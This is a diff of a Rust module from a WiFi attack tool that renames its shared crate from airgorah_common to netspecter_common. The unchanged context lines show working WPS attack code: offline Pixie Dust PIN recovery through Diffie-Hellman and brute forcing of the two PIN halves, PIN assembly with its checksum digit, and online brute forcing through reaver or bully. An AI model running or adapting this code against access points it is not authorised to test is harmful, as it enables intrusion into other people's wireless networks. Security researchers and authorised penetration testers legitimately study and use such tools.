@@ -24,8 +24,8 @@
 //! The agent exposes each of these as a distinct attack strategy so the
 //! SmartWizard can pick the cheapest one that fits the observed target.
 
-use airgorah_common::encryption::Encryption;
-use airgorah_common::types::*;
+use netspecter_common::encryption::Encryption;
+use netspecter_common::types::*;
 use hmac::{Hmac, Mac};
 use serde::{Deserialize, Serialize};
 use sha1::Sha1;
@@ -163,7 +163,7 @@ pub fn try_pixie_dust(bssid: &str, m1: &[u8], m3: &[u8]) -> WpsResult {
 pub fn try_online_brute(bssid: &str, channel: &str, timeout_secs: u64) -> WpsResult {
     let started = std::time::Instant::now();
 
-    if airgorah_common::deps::which("reaver").is_none() && airgorah_common::deps::which("bully").is_none() {
+    if netspecter_common::deps::which("reaver").is_none() && netspecter_common::deps::which("bully").is_none() {
         return WpsResult {
             bssid: bssid.into(),
             strategy: WpsStrategy::OnlineBrute,
@@ -174,7 +174,7 @@ pub fn try_online_brute(bssid: &str, channel: &str, timeout_secs: u64) -> WpsRes
         };
     }
 
-    let tool = if airgorah_common::deps::which("reaver").is_some() {
+    let tool = if netspecter_common::deps::which("reaver").is_some() {
         "reaver"
     } else {
         "bully"
@@ -258,12 +258,12 @@ struct WpsExchange {
 struct ParseError(&'static str);
 
 fn parse_wps_exchange(m1: &[u8], m3: &[u8]) -> Result<WpsExchange, ParseError> {
-    let parsed = airgorah_common::wps_tlv::ParsedExchange::parse(m1, m3)
+    let parsed = netspecter_common::wps_tlv::ParsedExchange::parse(m1, m3)
         .map_err(|e| ParseError(match e {
-            airgorah_common::wps_tlv::TlvError::Truncated => "TLV stream truncated",
-            airgorah_common::wps_tlv::TlvError::LengthOverflow => "TLV length overflows buffer",
-            airgorah_common::wps_tlv::TlvError::WrongLength { .. } => "TLV field wrong length",
-            airgorah_common::wps_tlv::TlvError::TooShort => "buffer too short for TLV header",
+            netspecter_common::wps_tlv::TlvError::Truncated => "TLV stream truncated",
+            netspecter_common::wps_tlv::TlvError::LengthOverflow => "TLV length overflows buffer",
+            netspecter_common::wps_tlv::TlvError::WrongLength { .. } => "TLV field wrong length",
+            netspecter_common::wps_tlv::TlvError::TooShort => "buffer too short for TLV header",
         }))?;
     if !parsed.is_complete() {
         return Err(ParseError("missing required WPS fields (PKE/E-Nonce/E-Hash1/E-Hash2)"));
@@ -312,15 +312,15 @@ fn recover_pixie_dust_pin(ex: &WpsExchange, chip: &ChipPattern) -> Option<String
         // key and compute shared = PKR^PKE mod p. This is the standard
         // pixiedust-loop fallback when the AP's private key isn't
         // recoverable directly.
-        airgorah_common::wps_dh::compute_shared_secret(&ex.pke, &ex.pkr)
+        netspecter_common::wps_dh::compute_shared_secret(&ex.pke, &ex.pkr)
     } else {
         ex.pke // fallback to all-zero placeholder
     };
-    let shared_secret = airgorah_common::wps_dh::shared_secret_32(&shared_secret_192);
+    let shared_secret = netspecter_common::wps_dh::shared_secret_32(&shared_secret_192);
 
-    let first = airgorah_common::wps_crypto::brute_first_half(&ex.e_hash1, &shared_secret);
+    let first = netspecter_common::wps_crypto::brute_first_half(&ex.e_hash1, &shared_secret);
     let p1 = first.pin_half.as_ref()?;
-    let second = airgorah_common::wps_crypto::brute_second_half(&ex.e_hash2, &shared_secret);
+    let second = netspecter_common::wps_crypto::brute_second_half(&ex.e_hash2, &shared_secret);
     let p2 = second.pin_half.as_ref()?;
 
     // Stitch into the 7-digit PIN and compute the 8th checksum digit.
@@ -329,7 +329,7 @@ fn recover_pixie_dust_pin(ex: &WpsExchange, chip: &ChipPattern) -> Option<String
     let p2_bytes = p2.as_bytes();
     pin7[..4].copy_from_slice(p1_bytes);
     pin7[4..].copy_from_slice(&p2_bytes[..3]);
-    airgorah_common::wps_crypto::build_full_pin(&pin7)
+    netspecter_common::wps_crypto::build_full_pin(&pin7)
 }
 
 fn run_reaver_with_pin(bssid: &str, pin: &str) -> BruteOutcome {
